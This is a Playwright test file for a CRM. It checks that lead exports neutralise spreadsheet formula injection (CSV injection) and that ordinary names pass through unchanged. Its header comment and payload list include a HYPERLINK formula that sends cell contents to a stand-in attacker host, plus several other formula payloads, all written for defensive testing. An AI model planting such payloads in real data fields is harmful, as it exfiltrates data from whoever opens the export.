import { expect, test } from '@playwright/test';
import { apiSend, signIn } from './helpers';

/**
 * The lead export must not hand a spreadsheet a formula to run.
 *
 * WHY THIS FILE EXISTS. A CSV cell whose text begins with `=`, `+`, `-`, `@`, a tab or a carriage
 * return is a FORMULA to Excel, LibreOffice and Google Sheets — the surrounding quotes that make it
 * a valid CSV field are stripped during parsing and do not protect anything. The export used to
 * quote correctly and stop there, so a lead named
 *
 *     =HYPERLINK("http://attacker.example/?d="&A1,"…")
 *
 * executed when the agent opened their own lead list, sending neighbouring cells to an address the
 * attacker chose.
 *
 * WHAT MAKES IT REACHABLE, and why the test uses `lead_source: 'meta'`: lead names are not written
 * by the brokerage. They arrive from Meta lead-ad forms and CSV imports — free text typed by
 * strangers. The person harmed is the one who exported their own data.
 *
 * The test drives the real button and reads the real downloaded file, because the defect lived in
 * the browser: the server returns JSON and the CSV is assembled client-side, so an assertion against
 * the API response would have passed throughout the entire period the file was dangerous.
 */

/**
 * Every character a spreadsheet treats as "a formula starts here".
 *
 * `marker` is how the row is found again in the file, and it is deliberately free of quotes and
 * commas: the CSV writer doubles embedded quotes, so searching the file for the payload verbatim
 * would never match and the test would fail for the wrong reason. Each marker is also distinct,
 * so `+1+1` and `-1+1` cannot be mistaken for one another.
 */
const PAYLOADS = [
  { label: 'HYPERLINK exfiltration', lead: '=', marker: 'ZZHYPER', name: '=HYPERLINK("http://attacker.example/?d="&A1,"ZZHYPER")' },
  { label: 'plus', lead: '+', marker: 'ZZPLUS', name: '+1+1 ZZPLUS' },
  { label: 'minus', lead: '-', marker: 'ZZMINUS', name: '-1+1 ZZMINUS' },
  { label: 'at', lead: '@', marker: 'ZZAT', name: '@SUM(A1:A9) ZZAT' },
  { label: 'tab-prefixed', lead: '\t', marker: 'ZZTAB', name: '\t=1+1 ZZTAB' },
];

test.describe('lead export — spreadsheet formula injection', () => {
  for (const p of PAYLOADS) {
    test(`a lead named with a ${p.label} payload is exported as text, not as a formula`, async ({ page }) => {
      await signIn(page, 'agent');

      const created = await apiSend(page, 'POST', '/api/leads', {
        name: p.name,
        email: `csvinj.${Date.now()}.${Math.floor(Math.random() * 1e6)}@probe.test`,
        // The realistic delivery route for this payload.
        lead_source: 'meta',
      });
      expect(created.status, 'the probe lead must be created for this test to mean anything').toBeLessThan(300);
      const id = (created.body as { id?: number })?.id;

      try {
        await page.goto('/crm/lead');

        // Arm the listener before the click, or a fast download is missed.
        const wait = page.waitForEvent('download', { timeout: 20_000 });
        await page.getByRole('button', { name: /Export Leads/i }).click();
        const download = await wait;

        const stream = await download.createReadStream();
        const chunks: Buffer[] = [];
        for await (const c of stream) chunks.push(Buffer.from(c));
        const csv = Buffer.concat(chunks).toString('utf8');

        // The row is in the file at all — otherwise the assertions below pass vacuously.
        expect(csv, 'the probe lead must appear in the export').toContain(p.marker);

        const line = csv.split(/\r?\n/).find((l) => l.includes(p.marker));
        expect(line, 'the exported row must be findable').toBeTruthy();

        /*
         * THE ASSERTION. Name is the first column, so the line opens with that cell.
         *
         * It must begin `"'` — the quote that makes it a CSV field, then the apostrophe that tells a
         * spreadsheet the rest is literal text. `"=`, `"+`, `"-`, `"@` would all mean the formula
         * survived.
         *
         * Deliberately NOT asserted: which formula character follows the apostrophe. The application
         * trims leading whitespace when it saves a name, so the tab payload reaches the file leading
         * with `=` rather than a tab. That is fine — it is still caught — and pinning the test to the
         * character would make it fail over a detail that does not affect safety.
         */
        expect(line!.startsWith(`"'`), `the name cell must be neutralised, got: ${line!.slice(0, 40)}`).toBe(true);
        expect(/^"[=+\-@\t\r]/.test(line!), 'no formula character may open the cell').toBe(false);
      } finally {
        if (id) await apiSend(page, 'DELETE', `/api/leads/${id}`);
      }
    });
  }

  test('an ordinary name is untouched — the guard does not corrupt normal exports', async ({ page }) => {
    /*
     * The other half of the change. A fix that prefixed every cell would quietly damage every
     * export the brokerage has ever relied on, and would still pass the tests above.
     */
    await signIn(page, 'agent');
    const name = `Ordinary Name ${Date.now()}`;
    const created = await apiSend(page, 'POST', '/api/leads', {
      name, email: `plain.${Date.now()}@probe.test`, lead_source: 'website',
    });
    expect(created.status).toBeLessThan(300);
    const id = (created.body as { id?: number })?.id;

    try {
      await page.goto('/crm/lead');
      const wait = page.waitForEvent('download', { timeout: 20_000 });
      await page.getByRole('button', { name: /Export Leads/i }).click();
      const download = await wait;

      const stream = await download.createReadStream();
      const chunks: Buffer[] = [];
      for await (const c of stream) chunks.push(Buffer.from(c));
      const csv = Buffer.concat(chunks).toString('utf8');

      expect(csv).toContain(name);
      // No apostrophe was introduced in front of a perfectly ordinary value.
      expect(csv).not.toContain(`"'${name}`);
      expect(csv).toContain(`"${name}"`);
    } finally {
      if (id) await apiSend(page, 'DELETE', `/api/leads/${id}`);
    }
  });
});
